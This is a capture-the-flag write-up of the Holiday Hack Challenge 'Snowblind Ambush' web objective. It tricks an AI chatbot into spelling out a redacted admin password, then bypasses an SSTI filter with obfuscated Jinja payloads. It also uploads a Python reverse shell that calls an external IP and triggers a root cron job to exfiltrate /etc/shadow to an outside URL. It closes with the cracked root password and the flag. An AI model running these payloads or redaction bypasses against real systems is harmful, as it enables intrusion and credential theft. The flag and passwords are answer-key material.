|[Previous Objective:Act3 Freeski](HHC_2025_Template/act3_freeski_mjd.html)  |   [Table of Contents](HHC_2025_Template/index.html) | [About BerryDunn](HHC_2025_Template/hhc_2025_berrydunn.html)
| :----------------------- | :--------------------------------: | --------------------------------: |

| Objective: Snowblind Ambush    | Difficulty Level: 5 |
| :-----------------------: | :--------------------------: |
| Head to the Hotel to stop Frosty's plan. Torkel is waiting at the Grand Web Terminal. | Location: Grand Hotel |

## Solution Overview

Starting with only public access to the web application, reconnaisance was conducted to determine weaknesses. The chatbot was exploited to recover the admin password to the website. Once logged in, a file upload mechanism was discovered that allowed for abuse. A redirect used a parameter, that was discovered to allow Server Side Template Injection (SSTI). This was exploited to achieve Remote Code Execution (RCE) and access as the web application service account. A cron job was discovered that ran as root, and under specific conditions would exfiltrate an encrypted copy of the /etc/shadow file. With this file, the password for the root user was obtained. This was used to elevate permissions and obtain the flag.

| Activity           | Primary Tactic | MITRE ATT&CK Technique ID             | MITRE ATT&CK Technique Name |
| :-----------------------: | :--------------------------------: | :-----------------------: | :--------------------------------: |
| Gain Access to web application: Leak Sensitive Information | Reconnaissance | T1589 | Gather Victim Identity Information |
| Explore SSTI and achieve RCE: Insecure Software | Execution | T1190 | Exploit Public-Facing Application |
| Achieve Shell Access: Insecure File Upload	Resource | Development | T1608.001 | Upload Malware |
| Exfiltrate Data | Exfiltration | T1041 | Exfiltration Over C2 Channel |
| Decode PNG file | Defense Evasion | T1140 | Deobfuscate/Decode Files or Information |
| Crack hashed password for Root | Credential Access | T1110.002 | Password Cracking |
| Escalate Privileges | Privilege Escalation | T1548 | Abuse Elevation Control Mechanism |

## Detailed Solution
<details>
<summary>Click to expand</summary>

  ## Step One: Gain Access to web application : Leak Sensitive Information
  
Initial discovery activities of the website uncovered the following:
   
  - The landing page code included a javascript file that was not actually loaded, egg.js
    
    ![Landing Page Code](/images/snowblind_egg.js.jpg)
     
  - Reviewing the code gives a hint: "AI Gnomes do not know the difference between left and right"
    
    ![Chatbot Script Hint](/images/snowblind_egghint.jpg)
    
   - AI chatbot gives redacted and conflicting hints about the password for the application login
   
   Conversations with the chatbot revealed that it had information about the application admin account in the form of hints. Some of the hints are conflicting, making them unreliable. The chatbot redacts phrases, so it knows the password. The chatbot reveals the information when prompted to spell the password one character per line, defeating the redaction mechanisms. The password works for login, and additional functionality is available to explore. The left and right hint works as well. The chatbot will spell the password in reverse order.
  
   **admin password: an_elf_and_password_on_a_bird**
   
![Admin Password](/images/snowblind_adminpassword.jpg)

 
  - File upload mechanism
    The profile page contains a file upload mechanism. While the page indicates only allowed filetypes, it is possible to upload a file that contains script code. Upon upload, the file is renamed to admin_XXXXXXXXXXXXXXXX.png, with the placeholder changing with every upload. This is a way to get a payload into the application, but not a way to trigger it.

    ![File Upload](/images/snowblind_fileupload.jpg)
    
  - Parameter used after file upload
  After upload the page redirects and uses a parameter username.

      ![Redirect Parameter](/images/snowblind_parameter.jpg)
    
## Step Two: Explore SSTI and achieve RCE : Insecure Software
The hint indicates that the application is using Flask. There are two helpful resources for understanding SSTI:

[Server Side Template Injections with Jinja2](https://onsecurity.io/article/server-side-template-injection-with-jinja2/)

[Server Side Template Injection - Python - Payloads All The Things](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/Python/#summary) 

A basic test to see if this is possible is {{7*7}}, because the expression evaluates on the page, then SSTI is possible.

![SSTI Test](/images/snowblind_sstitest.jpg) 

Trial and error testing revealed the following filters and the obfuscations needed to bypass.
```
┌───────────────────────────────┐
│ 1. Payload Construction        │
│   - Bracket access             │
│   - Escaped underscores (\u005f, \137) 
│   - Reversed strings ('ssalc'|reverse) │
└───────────────┬───────────────┘
                │
                ▼
┌───────────────────────────────┐
│ 2. WAF Bypass                 │
│   - Literal "_" stripped       │
│   - Escapes reconstruct "_"    │
│   - Reverse evades keyword ban │
└───────────────┬───────────────┘
                │
                ▼
┌───────────────────────────────┐
│ 3. Dunder Reconstruction      │
│   - __class__ rebuilt          │
│   - __mro__ rebuilt            │
└───────────────┬───────────────┘
                │
                ▼
┌───────────────────────────────┐
│ 4. Traversal into Internals   │
│   - attr('__subclasses__')()  │
│   - Returns real class list    │
└───────────────┬───────────────┘
                │
                ▼
┌───────────────────────────────┐
│ 5. Subclass Enumeration       │
│   - collections.OrderedDict    │
│   - enum._EnumDict             │
│   - werkzeug.datastructures... │
│   - flask.config.Config        │
│   ...                          │
└───────────────┬───────────────┘
                │
                ▼
┌───────────────────────────────┐
│ 6. Patched Routes             │
│   - object.__subclasses__() → 500
│   - mro()[0].__subclasses__() → 500
│   → Sandbox hardening present  │
└───────────────────────────────┘
```
This script was used to enumerate the indexes and evaluate if RCE is possible. The initial command used was a simple 'whoami".

The enumeration script source code is located here: [Enumeration Script](/resources/snowblind_enumeration2.py)

![SSTI Enumeration](/images/snowblind_enumeration1.jpg) 

The following indexes where discovered that would allow RCE:

![SSTI Enumeration](/images/snowblind_enumeration2.jpg) 

## Step Three: Achieve Shell Access : Insecure File Upload

The following payload was inserted into a file called payload.jpg and uploaded to the admin profile.

```
#!/bin/sh
export RHOST="45.79.190.29";export RPORT=4444;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

Selecting index 205 with get > os > popen.read() as our target, the following command was executed, resulting in a shell running in the www-data context.

```
sh /app/static/images/admin\\u005ff1f9cc53781abb79\\u002epng
```

## Step Four: Exfilitrate Data : Insecure processes / Data Leakage

With initial access established, time for more recon. An interesting cron job was located in /etc/cron/cron.d/mycron. It runs a backup script every minute as root. 

![Cron Job](/images/snowblind_cronjob.jpg) 

The script does the following:
- it looks for a file in /dev/shm with a name formatted according to this pattern: '\\.frosty[0-9]+$'
- it reads the file and applies a regular expression that requires at least the final two characters of the url to be letters and not numbers
- if the regular experssion is true, it encrypts a copy of /etc/shadow and posts it to the url

![URL Regex](/images/snowblind_regex.jpg) 

A copy of the backup script is located here: [Backup Script](/resources/snowblind_backup.py)

An HTTP server was started on an external facing linux server on port 8000 to receive the data being exfitrated.

The following command was issued in the shell as www-data to trigger the data exfiltration. The file was created, and moments later it was deposited on my web server.

```
echo "http://45-79-190-29.ip.linodeusercontent.com:8000/exfil" > /dev/shm/.frosty999
```

The exfiltrated data file is located here: [Exfiltrated File](/resources/shadow_exfil.png)

## Step Five:  Decode PNG file : Leak Sensitive Information

Since we have the backup script, we know the encryption mechanism. We also know what the first block of data encrypted is "root:$". With this information, we can decode the file.

Using this script to decode: [PNG Decoder Script](/resources/snowblind_decodepng3.py)

The file was damaged or incomplete, so the script suppresses errors and forces the data to be extracted. The backup script indicates that the data is exfiltrated is stored in the Blue channel of the file. The other channels can be ignored. Running the script reveals the exfiltrated data stored in the file.

![Decoded PNG File](/images/snowblind_decodedpng.jpg) 

## Step Six: Crack Hash for Root : Weak Password 

With the password hash, salt, and the algorithm used, we can attempt to crack the hash using John the Ripper and the rockyou word list.

![John the Ripper](/images/snowblind_johntheripper.jpg) 

**root password: jollyboy**

## Step Seven: Escalate privileges : Escalate privileges

With root password, it is a simple matter to escalate privileges using the su command. Once root, there is a bash script in the /root directory. Executing the script reveals the flag.
  
![Privilege Escalation](/images/snowblind_privilegeescalation.jpg) 


**Answer: hhc25{Frostify_The_World_c05730b46d0f30c9d068343e9d036f80}**

</details>

## Tools Reference

| Tools Used           | Tool Version |
| :-----------------------: | :--------------------------------: |
| John the Ripper | 1.9.0-jumbo-1+bleeding-aec1328d6c | 


## Hints Reference
| Provided By         | Hint |
| :-----------------------: | :--------------------------------: |
| Santa | Codes: If you can't get your payload to work, perhaps you are missing some form of obfuscation? A computer can understand many languages and formats, find one that works! Don't give up until you have tried at least eight different ones, if not, then it's truely hopeless. |
| Santa | Overtly Helpful?: I think admin is having trouble, remembering his password. I wonder how he is retaining access, I'm sure someone or something is helping him remembering. Ask around! |
| Torkel | I've been studying this web application that controls part of Frosty's infrastructure. There's a Flask backend with an AI chatbot that seems to have access to sensitive system information. Think of this as finding a way up the skorstein into Frosty's system - we need to exploit this chatbot to gain access and ultimately stop Frosty from freezing everything. Can you help me get through these defenses?|
## Acknowledgements
| Provided By         | Notes |
| :-----------------------: | :--------------------------------: |
| Fluffme | Helped to identify flaws in my method that I was using for RCE. My shell was deficient. |
| Khesperus | Sanity checks on achieving shell and on decrypting the png file. |


|[Previous Objective: Act3 Freeski](HHC_2025_Template/act3_hackagnome_mjd.html)  |   [Table of Contents](HHC_2025_Template/index.html) | [Next Objective](HHC_2025_Template/act3_frosty_snowglobe_machine_mjd.html)
| :----------------------- | :--------------------------------: | --------------------------------: |
